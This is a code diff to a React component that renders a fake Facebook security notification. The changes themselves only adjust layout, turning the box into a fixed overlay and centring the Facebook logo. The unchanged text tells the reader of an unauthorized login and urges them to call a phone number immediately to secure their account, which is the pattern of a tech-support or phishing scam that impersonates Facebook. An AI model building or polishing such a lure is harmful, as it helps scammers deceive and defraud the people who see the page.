@@ -100,24 +100,23 @@ export function FacebookNotification() {
   };
 
   return (
-    <div className="min-h-screen w-full flex items-center justify-center p-4 bg-gray-50">
+    <div className="fixed w-full flex items-center justify-center p-4 bg-gray-50">
       <div className="w-full max-w-lg border-t-4 border-t-[#1877F2] shadow-lg bg-white rounded-lg">
-        <div className="flex flex-row items-start justify-between p-4 pb-2">
-          <div className="flex items-center gap-2">
-            <div className="flex items-center justify-center rounded-full ">
-              <img 
-                src="/facebook.svg" 
-                alt="Facebook" 
-                className="h-24 w-24 sm:h-32 sm:w-20 md:h-24 md:w-24" 
-              />
-            </div>
-          </div>
+        <div className="flex flex-row items-start justify-between p-4 pb-4">
+        <div className="w-full flex justify-center items-center">
+  <div className="rounded-full">
+    <img 
+      src="/facebook.svg" 
+      alt="Facebook" 
+      className="h-24 w-24 sm:h-32 sm:w-20 md:h-24 md:w-24 object-contain" 
+    />
+  </div>
+</div>
           <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
             <X className="h-4 w-4 sm:h-5 sm:w-5" />
             <span className="sr-only">Close</span>
           </button>
         </div>
-
         <div className="p-4 sm:p-6">
           <div className="space-y-4">
             <div className="flex items-start gap-3 rounded-lg bg-blue-50 p-3 sm:p-4">
@@ -129,14 +128,12 @@ export function FacebookNotification() {
                 </p>
               </div>
             </div>
-
             <div className="space-y-2">
               <p className="text-sm sm:text-base md:text-lg text-gray-700">
                 If you did not authorize this login, it is strongly recommended to take immediate action. Please call the number below right away to log out from the unknown device and secure your account:
               </p>
             </div>
           </div>
-
           <div className="flex flex-col sm:flex-row justify-center gap-3 sm:gap-4 mt-6 sm:mt-8">
             <button 
               onClick={handleRegisterClick}
@@ -156,11 +153,9 @@ export function FacebookNotification() {
             </button>
           </div>
         </div>
-
         <div className="h-px bg-gray-200 my-4" />
       </div>
     </div>
   );
 }
-
 export default FacebookNotification;
